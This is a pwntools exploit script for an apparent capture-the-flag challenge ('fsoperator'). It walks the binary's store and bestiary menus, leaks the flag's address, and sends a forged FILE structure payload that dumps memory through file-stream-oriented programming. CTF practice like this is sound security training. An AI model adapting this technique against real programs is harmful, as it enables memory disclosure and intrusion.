#!/usr/bin/env python3

from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

e = context.binary = ELF("terminal.bin")

if args.LIBC:
    libc = ELF(args.LIBC)
else:
    libc = e.libc

r = ROP([e])

gs = '''
continue
'''



def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote ("spaceheroes-fsoperator.chals.io", 443, ssl=True, sni="spaceheroes-fsoperator.chals.io")

    else:
        return process(e.path)
p = start()

if args.TEST:
    p.interactive()
    exit()

# pwntools tutorial: https://docs.pwntools.com/en/stable/filepointer.html
# learn more: https://niftic.ca/posts/fsop/ 
# feedback?

# exploit:
p.recvuntil(b"= ")
flag = int(p.recvline(), 16)

print("opening store")
p.sendline(b"store")
pause(1)

print("trying to buy shovel")
p.sendline(b"flashlight")
pause(3)

print("trying to buy flag")
p.sendline(b"flag")
p.recvuntil(b"buy ")
address = int(p.recvline(), 16)
print(f"flag address found at",  hex(address))
pause(3)

print('opening bestiary')
p.sendline(b'bestiary')
pause(3)

print('sending add')
p.sendline(b'add')
pause(3)

fp = FileStructure()
payload = fp.write(addr=address, size=100)
print("sending payload")
pause(2)

p.recv()
p.send(payload)

p.interactive()

